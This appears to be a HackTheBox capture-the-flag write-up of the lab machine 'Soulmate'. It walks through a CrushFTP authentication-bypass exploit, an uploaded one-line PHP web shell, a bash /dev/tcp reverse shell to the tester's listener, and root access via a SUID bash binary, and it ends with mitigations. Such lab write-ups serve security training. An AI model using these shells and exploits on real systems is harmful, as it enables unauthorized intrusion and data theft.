# Soulmate - HackTheBox Writeup

## Machine Information
- **Name:** Soulmate
- **IP:** 10.10.11.86
- **Difficulty:** Medium
- **OS:** Linux

## Summary
Soulmate is a medium-difficulty Linux machine that involves exploiting a CrushFTP vulnerability to gain initial access, followed by privilege escalation through a misconfigured SUID bash binary.

## Reconnaissance

### Nmap Scan
```bash
nmap -Pn -p- --min-rate 500 -T4 10.10.11.86
```

**Open Ports:**
- 22/tcp (SSH)
- 80/tcp (HTTP)

### Service Enumeration
```bash
nmap -Pn -p22,80 -sC -sV 10.10.11.86
```

## Web Application Analysis

### Initial Web Discovery
```bash
# Check main HTTP service
curl -I http://10.10.11.86
whatweb http://10.10.11.86
```

### Virtual Host Discovery
```bash
# Found soulmate.htb domain
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts

# Subdomain enumeration
gobuster vhost -u http://10.10.11.86 -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -H "Host: FUZZ.soulmate.htb"
```

**Discovered Subdomains:**
- `ftp.soulmate.htb` - CrushFTP Web Interface

### Directory Enumeration
```bash
gobuster dir -u http://soulmate.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

## Vulnerability Assessment

### CrushFTP Analysis
Accessing `http://ftp.soulmate.htb/WebInterface/login.html` revealed a CrushFTP login portal.

**Technology Detection:**
```bash
whatweb http://ftp.soulmate.htb
```

### CVE Research
Found CrushFTP vulnerable to **CVE-2025-31161** - Authentication Bypass vulnerability.

## Exploitation

### CVE-2025-31161 Exploit
```bash
# Located exploit in exploitdb
searchsploit crushftp
cp /usr/share/exploitdb/exploits/multiple/remote/52295.py crushftp_exploit.py

# Execute exploit
python3 crushftp_exploit.py --target ftp.soulmate.htb --port 80 --check --exploit --new-user hacker --password P@ssw0rd123 --verbose
```

**Exploit Result:** Successfully gained admin access to CrushFTP web interface.

### Web Shell Upload
Through the CrushFTP admin interface:

1. **Created simple PHP shell:**
```php
<?php system($_GET['cmd']); ?>
```

2. **Uploaded shell to web directory**

3. **Accessed shell:**
```bash
curl "http://soulmate.htb/simple_shell.php?cmd=id"
```

### Reverse Shell
```bash
# Set up listener
nc -lvnp 4444

# Trigger reverse shell
curl "http://soulmate.htb/simple_shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'"
```

**Result:** Gained shell as `www-data`

## Post-Exploitation

### System Enumeration
```bash
# Check user information
cat /etc/passwd | grep bash
# Found user: ben

# Check SUID binaries
find / -perm -4000 2>/dev/null
```

**Critical Finding:** `/usr/bin/bash` has SUID permissions!

### Database Analysis
Found SQLite database with admin credentials:
```bash
# Location: /var/www/soulmate.htb/data/soulmate.db
# Found admin password hash and plaintext password in config

# Config file revealed plaintext password
cat /var/www/soulmate.htb/config/config.php
# Password: Crush4dmin990
```

### Privilege Escalation
**SUID Bash Exploitation:**
```bash
# Execute SUID bash with preserved privileges
/usr/bin/bash -p
```

**Result:** Instant root access due to misconfigured SUID bash binary.

## Flag Retrieval

### User Flag
```bash
find /home -name "user.txt" 2>/dev/null
cat /home/ben/user.txt
```

### Root Flag
```bash
find /root -name "root.txt" 2>/dev/null
cat /root/root.txt
```

## Key Vulnerabilities

1. **CVE-2025-31161:** CrushFTP Authentication Bypass
   - Allowed unauthorized admin access
   - Led to web shell upload capability

2. **SUID Bash Misconfiguration:**
   - `/usr/bin/bash` with SUID bit set
   - Instant privilege escalation to root

3. **Weak Access Controls:**
   - Web application allowed unrestricted file uploads
   - Database contained plaintext credentials

## Mitigation Recommendations

1. **Update CrushFTP:** Upgrade to version 11.3.1 or later
2. **Remove SUID from bash:** `chmod u-s /usr/bin/bash`
3. **File Upload Restrictions:** Implement proper file type validation
4. **Credential Security:** Use environment variables for sensitive data
5. **Regular Security Audits:** Monitor SUID binaries and permissions

## Tools Used
- Nmap
- Gobuster
- Searchsploit
- Custom CrushFTP exploit
- Netcat
- Curl

## Timeline
1. **Reconnaissance:** Port scanning and service enumeration
2. **Discovery:** Found CrushFTP on subdomain
3. **Vulnerability Research:** Identified CVE-2025-31161
4. **Initial Exploitation:** Gained CrushFTP admin access
5. **Web Shell:** Uploaded and executed PHP shell
6. **Reverse Shell:** Established persistent connection
7. **Privilege Escalation:** Exploited SUID bash binary
8. **Flag Retrieval:** Obtained both user and root flags

## Lessons Learned
- Always check for SUID binaries during enumeration
- CVE databases are valuable for finding recent vulnerabilities
- Subdomain enumeration can reveal additional attack surfaces
- Configuration files often contain sensitive information
- Multiple vulnerabilities can chain together for full compromise

---
*Writeup by: [Your Username]*
*Date: [Current Date]*
*HackTheBox: Soulmate*